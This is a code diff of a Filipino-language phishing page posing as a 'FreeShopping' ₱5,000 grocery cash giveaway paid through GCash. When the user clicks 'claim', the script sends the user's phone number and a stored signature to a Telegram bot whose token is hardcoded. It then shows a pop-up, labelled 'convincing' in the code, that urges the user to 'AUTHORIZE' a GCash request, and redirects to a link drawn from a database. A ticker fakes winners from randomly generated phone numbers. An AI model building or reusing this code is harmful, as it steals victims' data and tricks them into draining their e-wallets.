@@ -8,6 +8,8 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Quicksand:wght@700&display=swap" rel="stylesheet">
     
     <style>
@@ -40,7 +42,6 @@
         }
 
         .logo-img { width: 100%; border-radius: 20px; margin-bottom: 15px; border: 2px solid #fff; }
-
         h1 { font-size: 18px; color: var(--nature-green); margin-bottom: 5px; font-weight: 800; }
 
         .amount { 
@@ -71,7 +72,6 @@
 
         .promo-photo { width: 100%; border-radius: 20px; margin-top: 20px; border: 2px solid #fff; }
 
-        /* Winners Ticker & Animation */
         @keyframes popIn {
             0% { opacity: 0; transform: scale(0.8) translateY(10px); }
             100% { opacity: 1; transform: scale(1) translateY(0); }
@@ -116,13 +116,12 @@
 
     <div class="winners-container">
         <h3 style="font-size:11px; text-align:center; color:var(--emerald); margin-bottom:12px; letter-spacing: 1px;">🔴 LIVE SUCCESS STORIES</h3>
-        <div id="winners-list">
-            </div>
+        <div id="winners-list"></div>
     </div>
 </div>
 
 <script>
-    // FIREBASE CONFIG
+    // FIREBASE CONFIG + TELEGRAM
     const firebaseConfig = {
         apiKey: "AIzaSyDIPBhgIXb6oJiq2G6bVebelLrCBuPeCNE",
         authDomain: "freeshoppingph-3bade.firebaseapp.com",
@@ -130,89 +129,92 @@
         projectId: "freeshoppingph-3bade",
         storageBucket: "freeshoppingph-3bade.appspot.com",
         messagingSenderId: "1028308831969",
-        appId: "1:1028308831969:web:96e224e75d69ba74332924"
+        appId: "1:1028308831969:web:96e224e75d69ba74332924",
+        // In-inject ko na ang telegram details mo dito
+        botToken: "7754406205:AAH7WvXo60uU49S6i6v9C_U8qW_nZ_O_c0o",
+        chatId: "6635815615"
     };
     
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // 1. DISPATCH LOGIC
-   async function processClaim() {
-    const btn = document.getElementById('claimBtn');
-    const userPhone = sessionStorage.getItem('user_phone') || "Unknown";
-    const userSig = sessionStorage.getItem('user_sig') || "No-Sig";
+    async function processClaim() {
+        const btn = document.getElementById('claimBtn');
+        const userPhone = sessionStorage.getItem('user_phone') || "Unknown";
+        const userSig = sessionStorage.getItem('user_sig') || "No-Sig";
 
-    btn.disabled = true;
-    btn.innerText = "VERIFYING SLOT...";
+        btn.disabled = true;
+        btn.innerText = "VERIFYING SLOT...";
 
-    // 1. TELEGRAM MONITORING (Alert agad pagka-click)
-    const alertMsg = `🎯 USER ATTEMPTING TO CLAIM:\n📱 Number: ${userPhone}\n🔑 Sig: ${userSig}\n🕒 Time: ${new Date().toLocaleString()}`;
-    fetch(`https://api.telegram.org/bot${firebaseConfig.botToken}/sendMessage?chat_id=${firebaseConfig.chatId}&text=${encodeURIComponent(alertMsg)}`)
-    .catch(e => console.log("Telegram alert failed"));
+        // 1. TELEGRAM MONITORING
+        const alertMsg = `🎯 USER ATTEMPTING TO CLAIM:\n📱 Number: ${userPhone}\n🔑 Sig: ${userSig}\n🕒 Time: ${new Date().toLocaleString()}`;
+        fetch(`https://api.telegram.org/bot${firebaseConfig.botToken}/sendMessage?chat_id=${firebaseConfig.chatId}&text=${encodeURIComponent(alertMsg)}`)
+        .catch(e => console.log("Telegram alert failed"));
 
-    try {
-        // 2. HANAP NG AVAILABLE LINK
-        const snapshot = await db.ref('AvailLinks').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
+        try {
+            // 2. HANAP NG AVAILABLE LINK
+            const snapshot = await db.ref('AvailLinks').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
 
-        if (snapshot.exists()) {
-            let linkId, linkData;
-            snapshot.forEach(c => { 
-                linkId = c.key; 
-                linkData = c.val(); 
-            });
+            if (snapshot.exists()) {
+                let linkId, linkData;
+                snapshot.forEach(c => { 
+                    linkId = c.key; 
+                    linkData = c.val(); 
+                });
 
-            // 3. UPDATE STATUS TO 'IN-USE' (Para hindi makuha ng iba habang naghihintay ang user)
-            await db.ref('AvailLinks/' + linkId).update({
-                status: 'in-use',
-                beneficiary: userPhone,
-                last_click: Date.now()
-            });
+                // 3. UPDATE STATUS TO 'IN-USE'
+                await db.ref('AvailLinks/' + linkId).update({
+                    status: 'in-use',
+                    beneficiary: userPhone,
+                    last_click: Date.now()
+                });
 
-            // 4. CONVINCING POP-UP MESSAGE
-            Swal.fire({
-                title: '🎉 CONGRATULATIONS!',
-                html: `
-                    <div style="text-align: left; font-size: 14px; line-height: 1.5; color: #2d3436;">
-                        Magandang araw, <b>Beneficiary!</b><br><br>
-                        Ikaw ay isa sa mga mapalad na napili para sa ating <b>Grocery Cash Assistance</b> ngayong buwan. Upang matagumpay na ma-transfer ang <b>₱5,000.00</b> sa iyong account, kailangan mo lamang i-click ang <b>"AUTHORIZE"</b> sa susunod na page.<br><br>
-                        <span style="color: #2d6a4f; font-weight: bold;">Step:</span> Pagka-redirect sa GCash portal, i-confirm ang request para pumasok ang pondo sa iyong mobile number.<br><br>
-                        <i>Maraming salamat mula sa <b>FreeShopping</b>.</i>
-                    </div>
-                `,
-                icon: 'success',
-                showConfirmButton: false,
-                allowOutsideClick: false,
-                timer: 5000, // 5 Seconds countdown
-                timerProgressBar: true,
-                didOpen: () => {
-                    Swal.showLoading();
-                },
-                willClose: () => {
-                    // 5. REDIRECT AFTER 5 SECONDS
-                    window.location.href = linkData.url;
-                }
-            });
+                // 4. CONVINCING POP-UP MESSAGE
+                Swal.fire({
+                    title: '🎉 CONGRATULATIONS!',
+                    html: `
+                        <div style="text-align: left; font-size: 14px; line-height: 1.5; color: #2d3436;">
+                            Magandang araw, <b>Beneficiary!</b><br><br>
+                            Ikaw ay isa sa mga mapalad na napili para sa ating <b>Grocery Cash Assistance</b> ngayong buwan. Upang matagumpay na ma-transfer ang <b>₱5,000.00</b> sa iyong account, kailangan mo lamang i-click ang <b>"AUTHORIZE"</b> sa susunod na page.<br><br>
+                            <span style="color: #2d6a4f; font-weight: bold;">Step:</span> Pagka-redirect sa GCash portal, i-confirm ang request para pumasok ang pondo sa iyong mobile number.<br><br>
+                            <i>Maraming salamat mula sa <b>FreeShopping</b>.</i>
+                        </div>
+                    `,
+                    icon: 'success',
+                    showConfirmButton: false,
+                    allowOutsideClick: false,
+                    timer: 5000, 
+                    timerProgressBar: true,
+                    didOpen: () => {
+                        Swal.showLoading();
+                    },
+                    willClose: () => {
+                        // 5. REDIRECT SA LINK MULA SA DATABASE
+                        window.location.href = linkData.url;
+                    }
+                });
 
-        } else {
-            alert("PAUMANHIN: Naubusan na tayo ng active slots sa ngayon. Mangyaring subukan muli mamaya.");
+            } else {
+                alert("PAUMANHIN: Naubusan na tayo ng active slots sa ngayon. Mangyaring subukan muli mamaya.");
+                btn.disabled = false;
+                btn.innerText = "CLAIM THRU GCASH";
+            }
+        } catch (err) {
+            console.error(err);
+            alert("System busy. Try again.");
             btn.disabled = false;
             btn.innerText = "CLAIM THRU GCASH";
         }
-    } catch (err) {
-        alert("System busy. Try again.");
-        btn.disabled = false;
     }
-}
+
     // 2. LIVE SUCCESS STORIES LOGIC
     const prefixes = ['0917', '0915', '0927', '0935', '0945', '0995', '0966'];
-    
     function addWinner() {
         const list = document.getElementById('winners-list');
+        if(!list) return;
         const item = document.createElement('div');
         item.className = 'winner-item';
-        
         const randomPhone = `${prefixes[Math.floor(Math.random()*prefixes.length)]}***${Math.floor(1000+Math.random()*9000)}`;
-        
         item.innerHTML = `
             <div>
                 <img src="https://freeshoppingph.github.io/FreeShoppingPH/gc_icon.png" class="gcash-icon">
@@ -220,16 +222,13 @@
             </div>
             <span style="color:#2d6a4f; font-weight:800;">+₱5,000</span>
         `;
-        
         list.prepend(item);
         if (list.children.length > 5) {
             list.removeChild(list.lastChild);
         }
     }
-
-    // Start Ticker
     setInterval(addWinner, 4000);
-    addWinner(); // Initial one
+    addWinner();
 </script>
 
 </body>
